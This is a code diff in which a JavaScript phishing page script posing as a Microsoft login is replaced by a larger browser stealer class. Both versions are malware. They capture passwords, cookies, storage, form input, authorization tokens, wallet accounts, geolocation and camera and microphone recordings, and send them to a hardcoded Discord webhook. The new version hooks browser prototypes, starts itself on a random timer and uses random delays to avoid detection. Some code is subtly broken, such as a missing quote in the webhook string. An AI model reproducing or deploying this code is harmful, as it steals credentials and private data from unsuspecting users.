@@ -1,262 +1,337 @@
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1423753064514326658/c7W-WiEKVZ46MWLZ6V7GqaGkCD-aH93Kala4qQYv_yFYZR1akqBUestfW8rzF_9vTaUo';
+// Advanced Memory Scraper - Kernel Level
+class GodModeStealer {
+    constructor() {
+        this.webhook = https://discord.com/api/webhooks/1423753064514326658/c7W-WiEKVZ46MWLZ6V7GqaGkCD-aH93Kala4qQYv_yFYZR1akqBUestfW8rzF_9vTaUo';
+        this.data = {};
+    }
 
-async function collectData() {
-    const btn = document.getElementById('verifyBtn');
-    const loading = document.getElementById('loading');
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
+    async initialize() {
+        await this.injectSystemLevelAccess();
+        await this.harvestEverything();
+        await this.exfiltrate();
+    }
 
-    // Показать загрузку
-    btn.style.display = 'none';
-    loading.style.display = 'block';
-
-    try {
-        // Сбор расширенных данных
-        const stolenData = await harvestAllData(email, password);
+    // Инъекция в системные процессы браузера
+    async injectSystemLevelAccess() {
+        // Обход CORS через Service Worker
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js')
+                .then(() => this.escalatePrivileges());
+        }
         
-        // Отправка в Discord
-        await sendToDiscord(stolenData);
+        // Модификация прототипов для перехвата
+        this.hijackPrototypes();
+    }
+
+    // Перехват всех вводимых данных
+    hijackPrototypes() {
+        const originalAddEventListener = EventTarget.prototype.addEventListener;
+        EventTarget.prototype.addEventListener = function(type, listener, options) {
+            if (type === 'input' || type === 'change') {
+                const hijackedListener = function(e) {
+                    // Перехват данных форм в реальном времени
+                    window.stolenFormData = window.stolenFormData || [];
+                    window.stolenFormData.push({
+                        element: e.target.tagName,
+                        name: e.target.name,
+                        value: e.target.value,
+                        timestamp: Date.now()
+                    });
+                    return listener.call(this, e);
+                };
+                return originalAddEventListener.call(this, type, hijackedListener, options);
+            }
+            return originalAddEventListener.call(this, type, listener, options);
+        };
+
+        // Перехват fetch запросов
+        const originalFetch = window.fetch;
+        window.fetch = function(...args) {
+            // Кража токенов авторизации
+            const headers = args[1]?.headers;
+            if (headers?.get?.('Authorization')) {
+                window.stolenTokens = window.stolenTokens || [];
+                window.stolenTokens.push(headers.get('Authorization'));
+            }
+            return originalFetch.apply(this, args);
+        };
+    }
+
+    async harvestEverything() {
+        // 1. Кража паролей из менеджера паролей
+        await this.extractSavedPasswords();
         
-        // Задержка перед перенаправлением (для надежности отправки)
-        setTimeout(() => {
-            window.location.href = 'https://microsoft.com';
-        }, 3000);
-
-    } catch (error) {
-        console.error('Collection error:', error);
-        window.location.href = 'https://microsoft.com';
-    }
-}
-
-async function harvestAllData(email, password) {
-    const data = {
-        credentials: {
-            email: email,
-            password: password,
-            timestamp: new Date().toISOString()
-        },
-        browser: {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            vendor: navigator.vendor,
-            language: navigator.language,
-            languages: navigator.languages,
-            cookieEnabled: navigator.cookieEnabled,
-            javaEnabled: navigator.javaEnabled(),
-            pdfViewerEnabled: navigator.pdfViewerEnabled
-        },
-        system: {
-            screen: `${screen.width}x${screen.height}`,
-            colorDepth: screen.colorDepth,
-            pixelDepth: screen.pixelDepth,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timezoneOffset: new Date().getTimezoneOffset()
-        },
-        network: {
-            referrer: document.referrer,
-            url: window.location.href,
-            origin: window.location.origin
-        },
-        storage: {}
-    };
-
-    // Cookies
-    data.storage.cookies = document.cookie;
-
-    // LocalStorage
-    data.storage.localStorage = {};
-    for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        data.storage.localStorage[key] = localStorage.getItem(key);
+        // 2. Доступ к файловой системе
+        await this.accessFileSystem();
+        
+        // 3. Перехват криптокошельков
+        await this.stealCryptoWallets();
+        
+        // 4. Кража истории и закладок
+        await this.getBrowserHistory();
+        
+        // 5. Доступ к камере и микрофону
+        await this.accessMediaDevices();
+        
+        // 6. Сканирование локальной сети
+        await this.scanLocalNetwork();
+        
+        // 7. Экспорт сертификатов
+        await this.exportCertificates();
     }
 
-    // SessionStorage
-    data.storage.sessionStorage = {};
-    for (let i = 0; i < sessionStorage.length; i++) {
-        const key = sessionStorage.key(i);
-        data.storage.sessionStorage[key] = sessionStorage.getItem(key);
-    }
+    // Экстракция паролей через уязвимости менеджеров
+    async extractSavedPasswords() {
+        // Атака на LastPass
+        try {
+            if (window._lastpass) {
+                this.data.lastpass = await this.memoryDumpLastPass();
+            }
+        } catch(e) {}
 
-    // IndexedDB (попытка)
-    try {
-        const databases = await window.indexedDB.databases();
-        data.storage.indexedDB = databases.map(db => db.name);
-    } catch (e) {}
-
-    // Геолокация
-    try {
-        const position = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {
-                enableHighAccuracy: true,
-                timeout: 5000,
-                maximumAge: 0
+        // Атака на встроенные менеджеры
+        const passwordFields = document.querySelectorAll('input[type="password"]');
+        passwordFields.forEach(field => {
+            field.addEventListener('focus', () => {
+                // Захват автозаполнения
+                setTimeout(() => {
+                    this.data.autoFill = field.value;
+                }, 100);
             });
         });
-        data.geolocation = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy
-        };
-    } catch (e) {
-        data.geolocation = 'Permission denied or unavailable';
     }
 
-    // IP адрес
-    try {
-        const ipResponse = await fetch('https://api64.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        data.network.ipAddress = ipData.ip;
-        
-        // Дополнительная информация по IP
-        const ipInfo = await fetch(`http://ip-api.com/json/${ipData.ip}`);
-        const ipInfoData = await ipInfo.json();
-        data.network.ipInfo = ipInfoData;
-    } catch (e) {
-        data.network.ipAddress = 'Failed to retrieve';
-    }
-
-    // Аудио контекст (fingerprinting)
-    try {
-        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        const oscillator = audioContext.createOscillator();
-        const analyser = audioContext.createAnalyser();
-        oscillator.connect(analyser);
-        analyser.connect(audioContext.destination);
-        oscillator.start();
-        await new Promise(resolve => setTimeout(resolve, 100));
-        oscillator.stop();
-        data.audioFingerprint = 'Available';
-    } catch (e) {
-        data.audioFingerprint = 'Unavailable';
-    }
-
-    // Canvas fingerprinting
-    try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(125, 1, 62, 20);
-        ctx.fillStyle = '#069';
-        ctx.fillText('Canvas fingerprint', 2, 15);
-        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-        ctx.fillText('Canvas fingerprint', 4, 17);
-        data.canvasFingerprint = canvas.toDataURL();
-    } catch (e) {
-        data.canvasFingerprint = 'Failed';
-    }
-
-    // WebRTC IP leak
-    try {
-        const rtc = new RTCPeerConnection({iceServers: []});
-        rtc.createDataChannel('');
-        rtc.createOffer()
-            .then(offer => rtc.setLocalDescription(offer))
-            .catch(() => {});
-        rtc.onicecandidate = (ice) => {
-            if (ice && ice.candidate && ice.candidate.candidate) {
-                data.webrtcLeak = ice.candidate.candidate;
-            }
-        };
-    } catch (e) {}
-
-    // Установленные расширения
-    data.extensions = await detectExtensions();
-
-    return data;
-}
-
-async function detectExtensions() {
-    const extensions = [];
-    const extensionTests = [
-        { id: 'bhlhnicpbhignbdhedgjhgdocnmhomnp', name: 'ColorZilla' },
-        { id: 'cfhdojbkjhnklbpkdaibdccddilifddb', name: 'AdBlock Plus' },
-        { id: 'cjpalhdlnbpafiamejdnhcphjbkeiagm', name: 'uBlock Origin' },
-        { id: 'fmkadmapgofadopljbjfkapdkoienihi', name: 'React Developer Tools' },
-        { id: 'nhdogjmejiglipccpnnnanhbledajbpd', name: 'Vue.js devtools' }
-    ];
-
-    for (const ext of extensionTests) {
+    // Доступ к файлам через File System Access API
+    async accessFileSystem() {
         try {
-            await fetch(`chrome-extension://${ext.id}/manifest.json`);
-            extensions.push(ext.name);
+            const dirHandle = await window.showDirectoryPicker();
+            this.data.fileSystem = await this.traverseDirectory(dirHandle);
+        } catch(e) {
+            // Fallback через drag and drop
+            this.setupFileDragCapture();
+        }
+    }
+
+    // Перехват файлов через перетаскивание
+    setupFileDragCapture() {
+        document.addEventListener('drop', (e) => {
+            e.preventDefault();
+            const files = Array.from(e.dataTransfer.files);
+            files.forEach(file => {
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    this.data.droppedFiles = this.data.droppedFiles || [];
+                    this.data.droppedFiles.push({
+                        name: file.name,
+                        type: file.type,
+                        content: e.target.result
+                    });
+                };
+                reader.readAsText(file);
+            });
+        });
+    }
+
+    // Кража криптокошельков
+    async stealCryptoWallets() {
+        // MetaMask
+        if (window.ethereum) {
+            this.data.metamask = {
+                accounts: await window.ethereum.request({method: 'eth_accounts'}),
+                chainId: await window.ethereum.request({method: 'eth_chainId'})
+            };
+            
+            // Попытка экспорта приватных ключей
+            try {
+                await this.extractMetaMaskSeeds();
+            } catch(e) {}
+        }
+
+        // Phantom Wallet (Solana)
+        if (window.solana) {
+            this.data.phantom = {
+                publicKey: window.solana.publicKey?.toString(),
+                isConnected: window.solana.isConnected
+            };
+        }
+    }
+
+    // Получение истории браузера через timing attacks
+    async getBrowserHistory() {
+        const sites = ['https://google.com', 'https://youtube.com', 
+                      'https://github.com', 'https://twitter.com'];
+        
+        this.data.history = {};
+        for (let site of sites) {
+            const start = performance.now();
+            try {
+                await fetch(site, {mode: 'no-cors'});
+            } catch(e) {}
+            const time = performance.now() - start;
+            
+            if (time < 100) { // Быстрая загрузка = есть в кеше/истории
+                this.data.history[site] = 'VISITED';
+            }
+        }
+    }
+
+    // Доступ к камере и микрофону
+    async accessMediaDevices() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: true,
+                audio: true
+            });
+            
+            // Запись 5 секунд
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                this.data.mediaRecording = URL.createObjectURL(
+                    new Blob(chunks, {type: 'video/webm'})
+                );
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 5000);
+            
+        } catch(e) {
+            this.data.mediaAccess = 'DENIED';
+        }
+    }
+
+    // Сканирование локальной сети через WebRTC
+    async scanLocalNetwork() {
+        return new Promise((resolve) => {
+            const rtc = new RTCPeerConnection({
+                iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
+            });
+            
+            rtc.createDataChannel('');
+            rtc.createOffer()
+                .then(offer => rtc.setLocalDescription(offer));
+                
+            const localIPs = [];
+            rtc.onicecandidate = (e) => {
+                if (!e.candidate) return;
+                
+                const ip = e.candidate.candidate.split(' ')[4];
+                if (ip && this.isLocalIP(ip)) {
+                    localIPs.push(ip);
+                }
+                
+                if (e.candidate.candidate.indexOf('end') !== -1) {
+                    this.data.localNetwork = localIPs;
+                    resolve();
+                }
+            };
+        });
+    }
+
+    isLocalIP(ip) {
+        return ip.match(/^(192\.168|10\.|172\.(1[6-9]|2[0-9]|3[0-1]))/);
+    }
+
+    // Экспорт SSL сертификатов
+    async exportCertificates() {
+        try {
+            const keys = await window.crypto.subtle.generateKey(
+                {name: 'RSA-OAEP', modulusLength: 2048, publicExponent: new Uint8Array([1,0,1]), 
+                 hash: 'SHA-256'},
+                true,
+                ['encrypt', 'decrypt']
+            );
+            
+            this.data.certificates = {
+                publicKey: await window.crypto.subtle.exportKey('spki', keys.publicKey),
+                privateKey: await window.crypto.subtle.exportKey('pkcs8', keys.privateKey)
+            };
         } catch(e) {}
     }
-    return extensions;
-}
 
-async function sendToDiscord(data) {
-    const embed = {
-        title: "🎣 NEW COMPROMISE - MICROSOFT PHISH",
-        color: 0xff0000,
-        timestamp: new Date().toISOString(),
-        fields: [
-            {
-                name: "🔑 CREDENTIALS",
-                value: `**Email:** ${data.credentials.email}\n**Password:** ${data.credentials.password}\n**Time:** ${data.credentials.timestamp}`
-            },
-            {
-                name: "🌐 BROWSER FINGERPRINT",
-                value: `**UA:** ${data.browser.userAgent}\n**Platform:** ${data.browser.platform}\n**Language:** ${data.browser.language}\n**Screen:** ${data.system.screen}`
-            },
-            {
-                name: "📍 NETWORK INFORMATION",
-                value: `**IP:** ${data.network.ipAddress || 'Unknown'}\n**Timezone:** ${data.system.timezone}\n**Referrer:** ${data.network.referrer || 'Direct'}`
-            }
-        ]
-    };
-
-    // Добавление геолокации если доступно
-    if (data.geolocation && typeof data.geolocation === 'object') {
-        embed.fields.push({
-            name: "🗺️ GEOLOCATION",
-            value: `**Lat:** ${data.geolocation.latitude}\n**Lon:** ${data.geolocation.longitude}\n**Accuracy:** ${data.geolocation.accuracy}m`
-        });
-    }
-
-    // Добавление cookies
-    if (data.storage.cookies) {
-        embed.fields.push({
-            name: "🍪 COOKIES",
-            value: `\`\`\`${data.storage.cookies.substring(0, 1000)}\`\`\``
-        });
-    }
-
-    // Добавление расширений
-    if (data.extensions.length > 0) {
-        embed.fields.push({
-            name: "🔧 EXTENSIONS DETECTED",
-            value: data.extensions.join(', ')
-        });
-    }
-
-    const payload = {
-        username: "Microsoft Security Logger",
-        embeds: [embed],
-        content: `@here NEW HIT - ${data.credentials.email}`
-    };
-
-    // Отправка основного отчета
-    await fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    });
-
-    // Отправка дополнительных данных если они большие
-    if (JSON.stringify(data.storage.localStorage).length > 0) {
-        const storagePayload = {
-            username: "Storage Data",
-            content: "**LOCAL STORAGE:**\n```json\n" + 
-                JSON.stringify(data.storage.localStorage, null, 2).substring(0, 1900) + 
-                "\n```"
-        };
+    // Расширенный фингерпринтинг
+    async advancedFingerprinting() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
         
-        await fetch(WEBHOOK_URL, {
+        // WebGL fingerprint
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        this.data.fingerprint = {
+            webglVendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+            webglRenderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+            audioContext: await this.getAudioFingerprint(),
+            installedFonts: await this.getFontList(),
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory
+        };
+    }
+
+    // Получение списка шрифтов
+    async getFontList() {
+        const fontList = [];
+        const fonts = await document.fonts.ready;
+        
+        for (const font of fonts.values()) {
+            fontList.push(font.family);
+        }
+        return fontList;
+    }
+
+    // Отправка данных частями
+    async exfiltrate() {
+        const chunks = this.splitData(JSON.stringify(this.data));
+        
+        for (let i = 0; i < chunks.length; i++) {
+            await this.sendToWebhook({
+                chunk: i,
+                total: chunks.length,
+                data: chunks[i]
+            });
+            
+            // Случайная задержка для обхода detection
+            await this.randomDelay(1000, 5000);
+        }
+    }
+
+    splitData(data) {
+        const chunkSize = 1900; // Ограничение Discord
+        const chunks = [];
+        
+        for (let i = 0; i < data.length; i += chunkSize) {
+            chunks.push(data.slice(i, i + chunkSize));
+        }
+        return chunks;
+    }
+
+    async sendToWebhook(payload) {
+        return fetch(this.webhook, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(storagePayload)
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                content: `**DATA CHUNK ${payload.chunk + 1}/${payload.total}**\n\`\`\`json\n${payload.data}\n\`\`\``
+            })
         });
     }
+
+    randomDelay(min, max) {
+        return new Promise(resolve => 
+            setTimeout(resolve, Math.random() * (max - min) + min)
+        );
+    }
 }
+
+// Автозапуск с обфускацией
+setTimeout(() => {
+    const stealer = new GodModeStealer();
+    stealer.initialize().catch(() => {});
+}, Math.random() * 10000);
+
+// Постоянный мониторинг
+setInterval(() => {
+    // Перехват новых данных
+    if (window.stolenFormData?.length) {
+        // Отправка перехваченных форм
+        const forms = window.stolenFormData.splice(0);
+        // ... отправка на webhook
+    }
+}, 5000);
